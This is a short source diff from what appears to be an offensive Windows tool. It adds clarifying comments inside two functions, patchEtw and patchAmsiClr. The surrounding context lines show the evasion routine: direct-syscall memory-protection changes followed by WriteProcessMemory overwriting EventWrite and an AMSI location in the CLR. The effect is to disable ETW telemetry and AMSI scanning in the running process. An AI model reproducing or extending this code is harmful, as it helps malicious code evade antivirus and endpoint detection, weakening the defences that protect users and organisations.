@@ -289,6 +289,8 @@ int static inline patchEtw()
     HANDLE hProcess = GetCurrentProcess();
     SIZE_T dwSize = 1024;
     void * protectBase = pEventWrite;
+    // NtProtectVirtualMemory may round/update BaseAddress in place; keep the original
+    // target pointer untouched for WriteProcessMemory/FlushInstructionCache.
     Sw3NtProtectVirtualMemory_(hProcess, &protectBase, &dwSize, PAGE_READWRITE, &oldprotect);
 
     #if defined(_M_ARM64) || defined(__aarch64__)
@@ -456,6 +458,8 @@ int static inline patchAmsiClr()
     HANDLE hProcess = GetCurrentProcess();
     SIZE_T dwSize = 1024;
     void * protectBase = found;
+    // NtProtectVirtualMemory may round/update BaseAddress in place; keep the original
+    // target pointer untouched for WriteProcessMemory/FlushInstructionCache.
     Sw3NtProtectVirtualMemory_(hProcess, &protectBase, &dwSize, PAGE_READWRITE, &oldprotect);
     
     WriteProcessMemory(hProcess, found, (PVOID)NewBytes, 14, nullptr);
